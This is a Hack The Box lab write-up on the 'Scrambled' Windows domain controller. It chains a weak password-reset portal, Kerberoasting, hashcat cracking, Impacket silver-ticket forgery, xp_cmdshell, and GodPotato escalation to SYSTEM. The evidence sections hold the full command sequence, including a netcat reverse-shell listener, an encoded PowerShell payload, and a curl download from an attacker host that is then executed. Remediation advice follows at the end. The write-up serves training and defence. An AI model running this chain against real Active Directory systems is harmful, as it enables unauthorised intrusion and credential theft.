---
title: "Scrambled — Weak Password Reset and Kerberos Ticket Forgery in Active Directory"
description: "A weak password reset enables Kerberoasting and silver-ticket forgery, then SeImpersonate abuse escalates to SYSTEM via GodPotato."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - silver-ticket
  - privilege-escalation
objective: "Chain a weak password reset, Kerberoasting, and silver-ticket forgery into SYSTEM-level control of an Active Directory host."
tools:
  - rustscan
  - feroxbuster
  - NetExec
  - rusthound-ce
  - hashcat
  - Impacket
  - GodPotato
  - netcat
skill: "Active Directory credential recovery and Kerberos ticket forgery"
outcome: "Administrative MSSQL access via a forged silver ticket and SYSTEM-level code execution through SeImpersonate abuse"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory domain controller with SQL Server 2019 exposed |
| Starting position | Unauthenticated network access |
| Objective | Chain a weak password reset, Kerberoasting, and silver-ticket forgery into SYSTEM-level control |
| Outcome | Domain user access, administrative MSSQL access via a forged silver ticket, and SYSTEM-level code execution |

## Weak reset to forged silver ticket

Scrambled is a Medium-rated Hack The Box Windows lab. An IIS intranet portal resets any user's password to their username. The resulting domain account is used to Kerberoast a service account with a weak password, and the cracked password's NTLM hash forges a silver ticket against the MSSQL service. Administrative database access then delivers a payload through `xp_cmdshell`, and GodPotato turns the service account's `SeImpersonatePrivilege` into `SYSTEM`. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Weak password reset → SMB credential validation → Kerberoasting `<SERVICE_ACCOUNT>` → silver-ticket forgery → MSSQL `xp_cmdshell` → GodPotato `SeImpersonate` abuse → SYSTEM**

## Domain controller and MSSQL from unauthenticated access

- **Target:** Windows Active Directory domain controller (`<DC_FQDN>`), at `<TARGET_IP>` in domain `<DOMAIN>`.
- **Exposed services:** DNS (53), HTTP/IIS (80), Kerberos (88), LDAP (389/636/3268/3269), SMB (445), MSSQL (1433), a custom API (4411) advertising `SCRAMBLECORP_ORDERS_V1.0.3`, and WinRM (5985).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from the exposed intranet and directory services to administrative and SYSTEM-level control, and demonstrate the impact of misconfigured password handling.
- **Constraints:** I kept activity inside the Hack The Box lab environment.

## Evidence: reset portal, Kerberoast, silver ticket, GodPotato

### 1. Service Enumeration

Observation: a fast TCP scan exposes an Active Directory domain controller with several distinct attack surfaces.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Scrambled-TCP
```

Truncated scan output:

```text
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00
4411/tcp open  found?        SCRAMBLECORP_ORDERS_V1.0.3
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Significance: the combination of DNS, Kerberos, and LDAP identifies the host as a domain controller. IIS serves an intranet portal, MSSQL is directly exposed, and WinRM is available. The custom API on port 4411 was noted but played no role in the recorded chain.

Result: the output establishes an AD domain controller exposing an intranet web portal, MSSQL, and WinRM.

### 2. Web Service Discovery and Password Reset

Observation: directory enumeration on the IIS portal reveals a password-reset endpoint and a support form.

```bash
feroxbuster --url http://<DOMAIN> --wordlist <COMMON_WORDLIST>
```

```text
http://<TARGET_IP>/passwords.html
http://<TARGET_IP>/supportrequest.html
```

The `/passwords.html` page advertises the reset behavior:

```text
leave a message stating your username and we will reset your password to be the same as the username.
```

Significance: the portal resets any account's password to its username with no verification, so any known username becomes a usable credential.

Result: submitting the username `<LAB_USER>` through the support form produced a credential pair for `<LAB_USER>` that is subsequently validated through SMB.

### 3. SMB Access and Credential Validation

Observation: the reset credential can be tested against SMB on the domain controller.

```bash
nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER>' --shares -k
```

Authentication succeeds:

```text
SMB         <TARGET_IP>    445    <DC_HOST>        [+] <DOMAIN>\<LAB_USER>:<LAB_USER>
```

Significance: the weak reset mechanism yields a valid domain user context with authenticated access to SMB and other directory-integrated services. The accessible `Public` share holds a PDF document (`Network Security Changes.pdf`), and I collected domain data for attack-path mapping with RustHound-CE.

```bash
rusthound-ce --domain <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER>' --zip -o <DOMAIN>
```

Result: SMB authentication confirms domain user access, and the share and directory data broaden the mapped attack surface.

### 4. Kerberoasting the Service Account

Observation: with a domain account, Kerberoasting extracts a service account's TGS hash for offline cracking.

```bash
nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER>' -k --kerberoasting out.txt
```

```text
SAM Account Name:
<SERVICE_ACCOUNT>
Service Principal Names:
MSSQLSvc/<DC_FQDN>:1433
MSSQLSvc/<DC_FQDN>
```

The extracted TGS hash is cracked offline against a common wordlist:

```bash
hashcat out.txt /wordlists/rockyou.txt -D2
```

```text
:<SERVICE_PASSWORD>
```

Significance: the `<SERVICE_ACCOUNT>` service account is bound to the MSSQL SPN and uses a weak, dictionary-recoverable password. Recovering it enables NTLM hash computation and ticket forgery against the SQL service.

Result: the `<SERVICE_ACCOUNT>` password is recovered from its Kerberos TGS hash.

### 5. Silver Ticket Forgery and MSSQL Access

Observation: the cracked password yields the NTLM hash needed to forge a Kerberos service ticket.

```bash
python3 -c "from Cryptodome.Hash import MD4;h=MD4.new();h.update('<SERVICE_PASSWORD>'.encode('utf-16le'));print(h.hexdigest())"
```

```text
<NTLM_HASH>
```

A silver ticket is forged for the MSSQL SPN, impersonating `Administrator`:

```bash
impacket-ticketer -nthash '<NTLM_HASH>' -domain-sid '<DOMAIN_SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/<DC_FQDN>' 'Administrator'
```

```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k <DC_FQDN>
```

Inside the SQL session, `xp_cmdshell` is enabled for OS command execution:

```sql
enable_xp_cmdshell
```

Significance: a silver ticket is signed by the service account's key rather than the domain's `KRBTGT` key, so the recovered service password is enough to obtain administrative access to SQL Server without domain-wide forgery. `xp_cmdshell` then exposes direct OS command execution.

Result: the forged service ticket grants administrative MSSQL access, and `xp_cmdshell` is enabled in that session.

### 6. Privilege Escalation via SeImpersonate Abuse

Observation: the context holding the SQL session has `SeImpersonatePrivilege`, which potato-style tooling can abuse to spawn a `SYSTEM` process.

```bash
rlwrap nc -lvnp <LISTEN_PORT>
```

```sql
xp_cmdshell powershell -enc <BASE64_PAYLOAD>
```

The privilege is confirmed in the resulting session:

```text
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

GodPotato is staged and executed to escalate:

```bash
curl -o <LOCAL_BINARY> http://<ATTACKER_HOST>/<REMOTE_PATH>
./<LOCAL_BINARY> -cmd "powershell -enc <BASE64_PAYLOAD>"
```

```text
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1228
nt authority\system
```

Final context is confirmed:

```text
User Name           SID
=================== ========
nt authority\system S-1-5-18
```

Significance: `SeImpersonatePrivilege` lets the service account impersonate a higher-integrity token, and GodPotato turns that into a `SYSTEM` process at the highest integrity level on the host.

Result: the `whoami /all` output confirms execution as `NT AUTHORITY\SYSTEM`.

## Challenges and Decisions

I checked the notes for failed attempts or tradeoffs and found none; the chain followed the documented path.

## Outcome: administrative MSSQL and SYSTEM code execution

The chain ends with administrative MSSQL access through a forged silver ticket and `SYSTEM`-level code execution on the domain controller, confirmed by the `NT AUTHORITY\SYSTEM` identity output. The reset result, the share and directory collection, and the forged-ticket SQL access appear only in the notes, without captured console output; I could not verify them against console evidence.

## Recommendations: resets, service passwords, Kerberos, and MSSQL

The recommendations below follow the source remediation; this case study did not re-test them.

1. **Require verification for password resets.** The portal reset any password to the username with no confirmation, turning a known username into a credential. *Recommendation:* require secondary or e-mail verification before a reset and enforce complexity on the new password.
2. **Use strong, random passwords for service accounts.** The `<SERVICE_ACCOUNT>` password was recovered from a Kerberos TGS hash because it was a dictionary word. *Recommendation:* migrate service accounts to Group Managed Service Accounts (gMSAs) to remove password-based authentication.
3. **Harden Kerberos ticket issuance.** The service account's exposed key allowed offline cracking and ticket forgery. *Recommendation:* disable RC4 for Kerberos where possible, enable Kerberos Armoring (FAST), and monitor for anomalous TGS requests (event ID 4769).
4. **Reduce MSSQL service privileges.** The SQL service account held `SeImpersonatePrivilege`, enabling potato-style escalation. *Recommendation:* run MSSQL under a low-privileged virtual or managed service account and apply security updates that mitigate potato-type escalation.

## References

- [Hack The Box — Scrambled](https://app.hackthebox.com/machines/Scrambled)
- [RustScan](https://github.com/RustScan/RustScan) — fast TCP port scanner
- [feroxbuster](https://github.com/epi052/feroxbuster) — content discovery
- [NetExec](https://github.com/Pennyw0rth/NetExec) — SMB and Kerberos operations
- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) — Active Directory data collection
- [hashcat](https://hashcat.net/hashcat/) — offline hash cracking
- [Impacket](https://github.com/fortra/impacket) — `ticketer` and `mssqlclient`
- [GodPotato](https://github.com/BeichenDream/GodPotato) — `SeImpersonate` escalation
- [Netcat](https://eternallybored.org/misc/netcat/) — reverse-shell listener
- [xp_cmdshell (Microsoft Learn)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
- [Impersonate a client after authentication (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)
- [Group Managed Service Accounts overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [Kerberos authentication overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [What's New in Kerberos Authentication — Kerberos armoring (Microsoft Learn)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831747(v=ws.11))
- [Event ID 4769 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [Password must meet complexity requirements (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements)
